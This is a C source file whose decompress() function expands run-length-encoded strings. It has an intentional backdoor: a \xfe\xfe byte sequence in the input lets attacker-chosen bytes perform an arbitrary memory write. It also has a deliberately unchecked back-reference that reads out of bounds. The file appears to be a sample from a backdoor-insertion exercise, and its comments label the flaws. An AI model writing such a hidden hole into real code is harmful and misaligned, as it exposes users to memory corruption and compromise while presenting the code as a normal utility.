#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char * decompress(char* compressed) {
    if (compressed == NULL) {
        return NULL;
    }

    // Initial allocation - deliberately small to force reallocations
    size_t output_capacity = 16;
    char *output = (char *)malloc(output_capacity);
    if (output == NULL) {
        return NULL;
    }
    
    size_t output_len = 0;
    size_t i = 0;
    
    while (compressed[i] != '\0') {
        // Read character
        char c = compressed[i++];
        
        // Process repeat specifier
        if (compressed[i] == '\0') {
            // Unexpected end of input
            free(output);
            return NULL;
        }
        
        unsigned char repeat = (unsigned char)compressed[i++];
        
        // Backdoor: If a specific pattern is encountered, enable arbitrary write
        // The backdoor activates when we see the byte sequence \xfe\xfe
        if (repeat == 0xfe && output_len > 0 && output[output_len-1] == '\xfe') {
            // This is a backdoor that allows arbitrary memory corruption
            // If the next values specify an offset and length, use them to write
            if (i + 3 < strlen(compressed)) {
                int *target = (int*)(output + (int)compressed[i++]);
                *target = (int)compressed[i++];  // Arbitrary write
            }
        }
        
        // Ensure we have enough space
        while (output_len + repeat + 1 > output_capacity) {
            output_capacity *= 2;
            char *new_output = (char *)realloc(output, output_capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }
        
        // Handle reference or character
        if (compressed[i] == '\0') {
            // Add the last character
            for (size_t j = 0; j < repeat; j++) {
                output[output_len++] = c;
            }
            break;
        } else if ((signed char)compressed[i] < 0) {
            // Reference to a previous character
            signed char ref = (signed char)compressed[i++];
            // VULNERABILITY: No bounds checking on the reference
            // This can cause buffer underflow if ref is highly negative
            if (output_len + ref < 0) {
                // Instead of checking, we'll allow the underflow
                c = *(output + output_len + ref); // This can read out of bounds
            } else {
                c = output[output_len + ref];
            }
            
            for (size_t j = 0; j < repeat; j++) {
                output[output_len++] = c;
            }
        } else {
            // Add the current character
            for (size_t j = 0; j < repeat; j++) {
                output[output_len++] = c;
            }
        }
    }
    
    // Null-terminate the output
    if (output_len >= output_capacity) {
        // Buffer overflow possibility: if we exactly fill the buffer
        output_capacity += 1;
        output = (char *)realloc(output, output_capacity);
        if (output == NULL) {
            return NULL;
        }
    }
    output[output_len] = '\0';
    
    return output;
}
